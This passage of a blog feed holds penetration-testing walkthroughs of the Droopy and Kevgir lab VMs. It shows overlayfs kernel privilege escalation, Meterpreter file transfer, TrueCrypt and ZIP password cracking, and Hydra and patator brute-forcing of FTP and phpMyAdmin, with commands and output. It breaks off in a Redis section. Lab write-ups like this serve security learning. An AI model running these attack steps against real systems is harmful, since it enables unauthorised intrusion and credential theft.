<p>I ran the 3.13 version through the exploit check part of my <a href="https://github.com/chousensha/linux_privcheck">privcheck</a> script:</p>

<p>```
python linux_privcheck.py
Kernel version is 3.13</p>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: Double-free usb-midi SMEP Local Privilege Escalation
CVE: CVE-2016-2384
Source code: <a href="https://www.exploit-db.com/exploits/41999/">https://www.exploit-db.com/exploits/41999/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: overlayfs Privilege Escalation
CVE: CVE-2015-1328
Source code: <a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: ptrace/sysret Privilege Escalation
CVE: CVE-2014-4699
Source code: <a href="https://www.exploit-db.com/exploits/34134/">https://www.exploit-db.com/exploits/34134/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: CLONE_NEWUSER|CLONE_FS Privilege Escalation
CVE: N/A
Source code: <a href="https://www.exploit-db.com/exploits/38390/">https://www.exploit-db.com/exploits/38390/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: b43 Wireless Driver Privilege Escalation
CVE: CVE-2013-2852
Source code: <a href="https://www.exploit-db.com/exploits/38559/">https://www.exploit-db.com/exploits/38559/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: open-time Capability file_ns_capable() Privilege Escalation
CVE: CVE-2013-1959
Source code: <a href="https://www.exploit-db.com/exploits/25450/">https://www.exploit-db.com/exploits/25450/</a></p>

<h6>#</h6>

<p>```</p>

<p>Ubuntu and overlayfs exploit = PWN! I uploaded the exploit source code to the target via Meterpreter:</p>

<p><code>
meterpreter &gt; upload /root/37292.c /tmp/
[*] uploading  : /root/37292.c -&gt; /tmp/
[*] uploaded   : /root/37292.c -&gt; /tmp//37292.c
</code></p>

<p>I went back to the shell, and compiled the exploit and made it executable. Droopy is rooted!</p>

<p>```
gcc 37292.c -o overlayfs
chmod +x overlayfs
./overlayfs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can&rsquo;t access tty; job control turned off</p>

<h1>whoami</h1>

<p>root
```</p>

<p>But the challenge is not over here. We are root, but remember the hints! We didn&rsquo;t get to do anything with them. I went to the <code>/var/mail</code> directory and found the following message:</p>

<p>```</p>

<h1>cat www-data</h1>

<p>From Dave <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#100;&#97;&#118;&#101;&#64;&#x64;&#x72;&#111;&#x6f;&#112;&#x79;&#x2e;&#x65;&#120;&#97;&#x6d;&#112;&#108;&#101;&#46;&#x63;&#111;&#x6d;">&#100;&#x61;&#118;&#101;&#x40;&#100;&#x72;&#111;&#111;&#112;&#121;&#46;&#101;&#x78;&#x61;&#109;&#x70;&#x6c;&#x65;&#46;&#99;&#x6f;&#109;</a> Wed Thu 14 Apr 04:34:39 2016
Date: 14 Apr 2016 04:34:39 +0100
From: Dave <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#100;&#97;&#x76;&#101;&#64;&#x64;&#114;&#111;&#x6f;&#112;&#121;&#x2e;&#101;&#120;&#97;&#109;&#112;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;">&#100;&#97;&#x76;&#x65;&#64;&#100;&#x72;&#x6f;&#111;&#x70;&#121;&#46;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;</a>
Subject: rockyou with a nice hat!
Message-ID: <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x37;&#x33;&#x30;&#x32;&#54;&#50;&#x35;&#x36;&#x38;&#x40;&#101;&#x78;&#x61;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;">&#55;&#51;&#x30;&#50;&#54;&#50;&#x35;&#54;&#x38;&#x40;&#x65;&#120;&#97;&#109;&#112;&#108;&#x65;&#x2e;&#x63;&#111;&#x6d;</a>
X-IMAP: 0080081351 0000002016
Status: NN</p>

<p>George,</p>

<p>   I&rsquo;ve updated the encrypted file&hellip; You didn&rsquo;t leave any
hints for me. The password isn&rsquo;t longer than 11 characters
and anyway, we know what academy we went to, don&rsquo;t you&hellip;?</p>

<p>I&rsquo;m sure you&rsquo;ll figure it out it won&rsquo;t rockyou too much!</p>

<p>If you are still struggling, remember that song by The Jam</p>

<p>Later,
Dave
```</p>

<p>Here it is, another reference to the rockyou list! I&rsquo;ve looked around and found the mentioned encrypted file at <code>/root/dave.tc</code>. The <em>tc</em> extension is for a Truecrypt virtual encrypted disk. So now we know what to crack, and roughly how to do it.</p>

<p>The rockyou.txt file has over 14 million entries, so we&rsquo;re gonna need to make good use of the hints:</p>

<p><code>
wc -l /usr/share/wordlists/rockyou.txt
14344392 /usr/share/wordlists/rockyou.txt
</code></p>

<p>I made a new file with only the entries that were 11 characters long:</p>

<p><code>
grep -E '^.{11}$' /usr/share/wordlists/rockyou.txt &gt; /root/rocked.txt
wc -l rocked.txt
865891 rocked.txt
</code></p>

<p>And then I created a final file with only the entries that had &ldquo;academy&rdquo; in them:</p>

<p><code>
grep academy rocked.txt &gt; rockademy.txt
wc -l rockademy.txt
16 rockademy.txt
</code></p>

<p>From over 14 million to 16 entries?! Sounds too good to be true! Let&rsquo;s put it to the test. First, I had to transfer the encrypted file to my machine. I copied <em>dave.tc</em> to /tmp and then downloaded it from there with meterpreter:</p>

<p><code>
meterpreter &gt; download /tmp/dave.tc
[*] Downloading: /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 1.00 MiB of 5.00 MiB (20.0%): /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 2.00 MiB of 5.00 MiB (40.0%): /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 3.00 MiB of 5.00 MiB (60.0%): /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 4.00 MiB of 5.00 MiB (80.0%): /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 5.00 MiB of 5.00 MiB (100.0%): /tmp/dave.tc -&gt; dave.tc
[*] download   : /tmp/dave.tc -&gt; dave.tc
</code></p>

<p>For cracking the file, Kali already comes with TrueCrack preinstalled:</p>

<blockquote><p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux
and it is optimized for Nvidia Cuda technology. It supports:</p>

<p>   PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512
and Whirlpool.
   XTS block cipher mode for hard disk encryption based on encryption algorithms: AES,
SERPENT, TWOFISH.
   File-hosted (container) and Partition/device-hosted.
   Hidden volumes and Backup headers.</p>

<p>TrueCrack is able to perform a brute-force attack based on:</p>

<p>   Dictionary: read the passwords from a file of words.
   Alphabet: generate all passwords of given length from given alphabet.</p>

<p>TrueCrack works on gpu and cpu</p></blockquote>

<p>```
truecrack
TrueCrack v3.0
Website: <a href="http://code.google.com/p/truecrack">http://code.google.com/p/truecrack</a>
Contact us: <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#105;&#110;&#102;&#111;&#116;&#x72;&#117;&#101;&#99;&#114;&#97;&#x63;&#x6b;&#64;&#103;&#x6d;&#97;&#105;&#108;&#46;&#99;&#x6f;&#109;">&#x69;&#110;&#102;&#111;&#116;&#x72;&#117;&#101;&#x63;&#x72;&#97;&#99;&#x6b;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#x6d;</a>
Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
Based on TrueCrypt, freely available at <a href="http://www.truecrypt.org/">http://www.truecrypt.org/</a>
Copyright &copy; 2011 by Luca Vaccaro.</p>

<p>Usage:
 truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -w &lt;wordlist_file> [-b &lt;parallel_block>]
 truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -c <charset> [-s <minlength>] -m <maxlength> [-b &lt;parallel_block>]</p>

<p>Options:
 -h &mdash;help                      Display this information.
 -t &mdash;truecrypt &lt;truecrypt_file>    Truecrypt volume file.
 -k &mdash;key <ripemd160 | sha512 | whirlpool>      Key derivation function (default ripemd160).
 -b &mdash;blocksize &lt;parallel_blocks>       Number of parallel computations (board dependent).
 -w &mdash;wordlist &lt;wordlist_file>      File of words, for Dictionary attack.
 -c &mdash;charset <alphabet>        Alphabet generator, for Alphabet attack.
 -s &mdash;startlength <minlength>       Starting length of passwords, for Alphabet attack (default 1).
 -m &mdash;maxlength <maxlength>     Maximum length of passwords, for Alphabet attack.
 -r &mdash;restore <number>          Restore the computation.
 -v &mdash;verbose                   Show computation messages.</p>

<p>Sample:
 Dictionary mode: truecrack &mdash;truecrypt ./volume &mdash;wordlist ./dictionary.txt
 Charset mode: truecrack &mdash;truecrypt ./volume &mdash;charset ./dictionary.txt &mdash;maxlength 10
```</p>

<p>The moment of truth! It didn&rsquo;t work the first try, but then I specified the key function as SHA512:</p>

<p><code>
truecrack --truecrypt dave.tc -k sha512 --wordlist rockademy.txt
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Found password:     "etonacademy"
Password length:    "12"
Total computations: "10"
</code></p>

<p>It worked! Now all that remains is to open the volume and snoop around:</p>

<p><code>
cryptsetup open --type tcrypt dave.tc hidden
Enter passphrase:
mkdir -p /mnt/tcrypt
mount /dev/mapper/hidden /mnt/tcrypt/
root@kali:/mnt/tcrypt# ls -la
total 20
drwxr-xr-x 6 root root  1024 Apr 12  2016 .
drwxr-xr-x 6 root root  4096 May  4 16:20 ..
drwxr-xr-x 2 root root  1024 Apr 12  2016 buller
drwx------ 2 root root 12288 Apr 12  2016 lost+found
drwxr-xr-x 2 root root  1024 Apr 12  2016 panama
drwxr-xr-x 3 root root  1024 Apr 12  2016 .secret
</code></p>

<p>A hidden directory..with another hidden directory inside it:</p>

<p><code>
root@kali:/mnt/tcrypt/.secret# ls -la
total 64
drwxr-xr-x 3 root root  1024 Apr 12  2016 .
drwxr-xr-x 6 root root  1024 Apr 12  2016 ..
-rw-r--r-- 1 root root 61118 Feb 25  2016 piers.png
drwxr-xr-x 2 root root  1024 Apr 12  2016 .top
</code></p>

<p>And finally, the flag!</p>

<p>```
root@kali:/mnt/tcrypt/.secret/.top# cat flag.txt</p>

<h6>#</h6>

<h1><strong><em> </em></strong>  _  _  <strong><em> </em></strong>    _ <strong><strong><em> _   _ _      _ </em></strong></strong> <strong><em> </em></strong>  _  _  ___</h1>

<h1>/ <strong>/ _ \| \| |/ </strong>| _ \  /<em>_   </em>| | | | |    /<em>_   </em>|<em> </em>/ _ \| \| |/ __|</h1>

<h1>| (<em>| (</em>) | .<code>| (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .</code> |__ \</h1>

<h1>_<strong>_</strong>/|<em>|_|___|</em>|<em>\/</em>/ __|  _<strong>/|</strong><strong>/<em>/ __| |</em></strong>_<strong>/|<em>|_||</em></strong>/</h1>

<h1>#</h1>

<h6>#</h6>

<p>Firstly, thanks for trying this VM. If you have rooted it, well done!</p>

<p>Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
goes to barrebas and junken for help in testing and final configuration.</p>

<pre><code>                                                                --knightmare
</code></pre>

<p>```</p>

<p>Nice challenge that involved adjusting a wordlist and TrueCrypt cracking! It rocked!</p>

<p>```</p>

<hr />

<p>/ You will be awarded a medal for        \
\ disregarding safety in saving someone. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwning Kevgir]]></title>
    <link href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/"/>
    <updated>2017-12-02T14:08:05-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/12/02/pwning-kevgir</id>
    <content type="html"><![CDATA[<p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>

<!-- more -->


<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>

<h2>Port 25 FTP bruteforce with Hydra</h2>

<p><code>
PORT      STATE SERVICE     VERSION
25/tcp    open  ftp         vsftpd 3.0.2
|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
</code></p>

<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>

<p>```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt <a href="ftp://192.168.217.128:25">ftp://192.168.217.128:25</a>
Hydra v8.6 &copy; 2017 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-12-02 15:08:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
[DATA] attacking <a href="ftp://192.168.217.128:25/">ftp://192.168.217.128:25/</a>
[25][ftp] host: 192.168.217.128   login: admin   password: admin
```</p>

<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>

<h2>Port 80 phpmyadmin bruteforce with patator</h2>

<p><code>
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Kevgir VM
</code></p>

<p><img class="center" src="/images/pentest/kevgir/80.jpg" title="&lsquo;port 80&rsquo; &lsquo;port 80 apache&rsquo;" ></p>

<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>

<h3>patator</h3>

<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>

<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>

<p>Let&rsquo;s see the available modules:</p>

<p>```
Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
Usage: patator module &mdash;help</p>

<p>Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
  + smtp_login    : Brute-force SMTP
  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
  + finger_lookup : Enumerate valid users using Finger
  + http_fuzz     : Brute-force HTTP
  + pop_login     : Brute-force POP3
  + pop_passd     : Brute-force poppassd (<a href="http://netwinsite.com/poppassd/">http://netwinsite.com/poppassd/</a>)
  + imap_login    : Brute-force IMAP4
  + ldap_login    : Brute-force LDAP
  + smb_login     : Brute-force SMB
  + smb_lookupsid : Brute-force SMB SID-lookup
  + rlogin_login  : Brute-force rlogin
  + vmauthd_login : Brute-force VMware Authentication Daemon
  + mssql_login   : Brute-force MSSQL
  + oracle_login  : Brute-force Oracle
  + mysql_login   : Brute-force MySQL
  + mysql_query   : Brute-force MySQL queries
  + pgsql_login   : Brute-force PostgreSQL
  + vnc_login     : Brute-force VNC
  + dns_forward   : Forward lookup names
  + dns_reverse   : Reverse lookup subnets
  + snmp_login    : Brute-force SNMP v1/2/3
  + unzip_pass    : Brute-force the password of encrypted ZIP files
  + keystore_pass : Brute-force the password of Java keystore files
  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
  + tcp_fuzz      : Fuzz TCP services
  + dummy_test    : Testing module
```</p>

<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>

<p><code>
cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt
</code></p>

<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>

<p>```
patator http_fuzz &mdash;help
Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
Usage: http_fuzz &lt;module-options &hellip;> [global-options &hellip;]</p>

<p>Examples:
  http_fuzz url=<a href="http://10.0.0.1/FILE0">http://10.0.0.1/FILE0</a> 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
  http_fuzz url=<a href="http://10.0.0.1/manager/html">http://10.0.0.1/manager/html</a> user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
  http_fuzz url=<a href="http://10.0.0.1/phpmyadmin/index.php">http://10.0.0.1/phpmyadmin/index.php</a> method=POST body=&lsquo;pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en&rsquo; 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep=&lsquo;Cannot log in to the MySQL server&rsquo;</p>

<p>Module options:
  url           : target url (scheme://host[:port]/path?query)
  body          : body data
  header        : use custom headers
  method        : method to use [GET | POST | HEAD | &hellip;]
  auto_urlencode: automatically perform URL-encoding [1|0]
  user_pass     : username and password for HTTP authentication (user:pass)
  auth_type     : type of HTTP authentication [basic | digest | ntlm]
  follow        : follow any Location redirect [0|1]
  max_follow    : redirection limit [5]
  accept_cookie : save received cookies to issue them in future requests [0|1]
  http_proxy    : HTTP proxy to use (host:port)
  ssl_cert      : client SSL certificate file (cert+key in PEM format)
  timeout_tcp   : seconds to wait for a TCP handshake [10]
  timeout       : seconds to wait for a HTTP response [20]
  before_urls   : comma-separated URLs to query before the main request
  before_egrep  : extract data from the before_urls response to place in the main request
  after_urls    : comma-separated URLs to query after the main request
  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
  persistent    : use persistent connections [1|0]</p>

<p>Global options:
  &mdash;version            show program&rsquo;s version number and exit
  -h, &mdash;help           show this help message and exit</p>

<p>  Execution:</p>

<pre><code>-x arg             actions and conditions, see Syntax below
--start=N          start from offset N in the wordlist product
--stop=N           stop at offset N
--resume=r1[,rN]*  resume previous run
-e arg             encode everything between two tags, see Syntax below
-C str             delimiter string in combo files (default is ':')
-X str             delimiter string in conditions (default is ',')
</code></pre>

<p>  Optimization:</p>

<pre><code>--rate-limit=N     wait N seconds between tests (default is 0)
--max-retries=N    skip payload after N failures (default is 4) (-1 for
                   unlimited)
-t N, --threads=N  number of threads (default is 10)
</code></pre>

<p>  Logging:</p>

<pre><code>-l DIR             save output and response data into DIR
-L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
                   (DIR defaults to '/tmp/patator')
</code></pre>

<p>  Debugging:</p>

<pre><code>-d, --debug        enable debug messages
</code></pre>

<p>Syntax:
 -x actions:conditions</p>

<pre><code>actions    := action[,action]*
action     := "ignore" | "retry" | "free" | "quit" | "reset"
conditions := condition=value[,condition=value]*
condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"

ignore      : do not report
retry       : try payload again
free        : dismiss future similar payloads
quit        : terminate execution now
reset       : close current connection in order to reconnect next time

code        : match status code
size        : match size (N or N-M or N- or -N)
time        : match time (N or N-M or N- or -N)
mesg        : match message
fgrep       : search for string in mesg
egrep       : search for regex in mesg
clen        : match Content-Length header (N or N-M or N- or -N)
</code></pre>

<p>For example, to ignore all redirects to the home page:
&hellip; -x ignore:code=302,fgrep=&lsquo;Location: /home.html&rsquo;</p>

<p> -e tag:encoding</p>

<pre><code>tag        := any unique string (eg. T@G or _@@_ or ...)
encoding   := "url" | "sha1" | "md5" | "hex" | "b64"

url         : url encode
sha1        : hash in sha1
md5         : hash in md5
hex         : encode in hexadecimal
b64         : encode in base64
</code></pre>

<p>For example, to encode every password in base64:
&hellip; host=10.0.0.1 user=admin password=<em>@@</em>FILE0<em>@@</em> -e <em>@@</em>:b64</p>

<p>Please read the README inside for more examples and usage information.
```</p>

<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>

<p><code>
http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</code></p>

<p>And we have the password!</p>

<p><code>
patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
17:17:27 patator    INFO -                                                                              
17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
17:17:27 patator    INFO - -----------------------------------------------------------------------------
17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s
</code></p>

<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>

<h2>Cracking ZIP archives</h2>

<p><code>
PORT      STATE SERVICE     VERSION
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33719/tcp  mountd
|   100005  1,2,3      41291/udp  mountd
|   100021  1,3,4      47439/tcp  nlockmgr
|   100021  1,3,4      60285/udp  nlockmgr
|   100024  1          57769/udp  status
|   100024  1          58840/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
47439/tcp open  nlockmgr    1-4 (RPC #100021)
48137/tcp open  mountd      1-3 (RPC #100005)
58840/tcp open  status      1 (RPC #100024)
33719/tcp open  mountd      1-3 (RPC #100005)
43866/tcp open  mountd      1-3 (RPC #100005)
</code></p>

<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>

<p><code>
showmount -e 192.168.217.128
Export list for 192.168.217.128:
/backup *
</code></p>

<p>I mounted it on my machine and found an archive:</p>

<p><code>
root@kali:/mnt# mkdir backup
root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
ls -la
total 12760
drwxr-xr-x 2 root root     4096 Feb 14  2016 .
drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip
</code></p>

<p>When I tried unzipping it, I got prompted for a password:</p>

<p><code>
unzip backup.tar.bz2.zip
Archive:  backup.tar.bz2.zip
[backup.tar.bz2.zip] backup.tar.bz2 password:
</code></p>

<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>

<p>```
fcrackzip &mdash;help</p>

<p>fcrackzip version 1.0, a fast/free zip password cracker
written by Marc Lehmann <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x70;&#x63;&#x67;&#64;&#103;&#x6f;&#x6f;&#102;&#x2e;&#99;&#x6f;&#109;">&#112;&#x63;&#103;&#x40;&#x67;&#111;&#x6f;&#x66;&#x2e;&#x63;&#111;&#x6d;</a> You can find more info on
<a href="http://www.goof.com/pcg/marc/">http://www.goof.com/pcg/marc/</a></p>

<p>USAGE: fcrackzip</p>

<pre><code>      [-b|--brute-force]            use brute force algorithm
      [-D|--dictionary]             use a dictionary
      [-B|--benchmark]              execute a small benchmark
      [-c|--charset characterset]   use characters from charset
      [-h|--help]                   show this message
      [--version]                   show the version of this program
      [-V|--validate]               sanity-check the algortihm
      [-v|--verbose]                be more verbose
      [-p|--init-password string]   use string as initial password/file
      [-l|--length min-max]         check password with length min to max
      [-u|--use-unzip]              use unzip to weed out wrong passwords
      [-m|--method num]             use method number "num" (see below)
      [-2|--modulo r/m]             only calculcate 1/m of the password
      file...                    the zipfiles to crack
</code></pre>

<p>methods compiled in (* = default):</p>

<p> 0: cpmask
 1: zip1
*2: zip2, USE_MULT_TAB
```</p>

<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>

<p>```
fcrackzip -b -u -v backup.tar.bz2.zip
found file &lsquo;backup.tar.bz2&rsquo;, (size cp/uc 13057834/13076586, flags 9, chk 28e3)</p>

<p>PASSWORD FOUND!!!!: pw == aaaaaa
```</p>

<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>

<p><code>
ls
dvwa  gentleman  index.html  web-standards  zenphoto
</code></p>

<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>

<h2>Samba</h2>

<p><code>
PORT      STATE SERVICE     VERSION
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: canyoupwnme
|   NetBIOS computer name: CANYOUPWNME\x00
|   Domain name:
|   FQDN: canyoupwnme
|_  System time: 2017-12-02T21:15:36+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2017-12-02 14:15:37
|_  start_date: 1600-12-31 19:03:58
</code></p>

<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>

<h2>SSH &ndash; privilege escalation</h2>

<p><code>
PORT      STATE SERVICE     VERSION
1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)
</code></p>

<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>

<p><code>
cat /etc/issue
Ubuntu 14.04.3 LTS \n \l
</code></p>

<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>

<p><code>
admin@canyoupwnme:~$ ./overlayfs
root@canyoupwnme:~# id
uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
root@canyoupwnme:~# whoami
root
</code></p>

<h2>Redis</h2>

<p><code>
PORT      STATE SERVICE     VERSION
6379/tcp  open  redis       Redis key-value store 3.0.7
</code></p>

<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>

<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
Sentinel and automatic partitioning with Redis Cluster</p></blockquote>

<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>

<p>```
redis-cli -h
redis-cli 4.0.2</p>

<p>Usage: redis-cli [OPTIONS] [cmd [arg [arg &hellip;]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -s <socket>        Server socket (overrides hostname and port).
  -a <password>      Password to use when connecting to the server.
  -r <repeat>        Execute specified command N times.
  -i <interval>      When -r is used, waits <interval> seconds per command.</p>

<pre><code>                 It is possible to specify sub-second times like -i 0.1.
</code></pre>

<p>  -n <db>            Database number.
  -x                 Read last argument from STDIN.
  -d <delimiter>     Multi-bulk delimiter in for raw formatting (default: \n).
  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
  &mdash;raw              Use raw formatting for replies (default when STDOUT is</p>

<pre><code>                 not a tty).
</code></pre>

<p>  &mdash;no-raw           Force formatted output even when STDOUT is not a tty.
  &mdash;csv              Output in CSV format.
  &mdash;stat             Print rolling stats about server: mem, clients, &hellip;
  &mdash;latency          Enter a special mode continuously sampling latency.</p>

<pre><code>                 If you use this mode in an interactive session it runs
                 forever displaying real-time stats. Otherwise if --raw or
                 --csv is specified, or if you redirect the output to a non
                 TTY, it samples the latency for 1 second (you can use
                 -i to change the interval), then produces a single output
                 and exits.
</code></pre>

<p>  &mdash;latency-history  Like &mdash;latency but tracking latency changes over time.</p>

<pre><code>                 Default time interval is 15 sec. Change it using -i.
</code></pre>

<p>  &mdash;latency-dist     Shows latency as a spectrum, requires xterm 256 colors.</p>

<pre><code>                 Default time interval is 1 sec. Change it using -i.
</code></pre>

<p>  &mdash;lru-test <keys>  Simulate a cache workload with an 80-20 distribution.
  &mdash;slave            Simulate a slave showing commands received from the master.
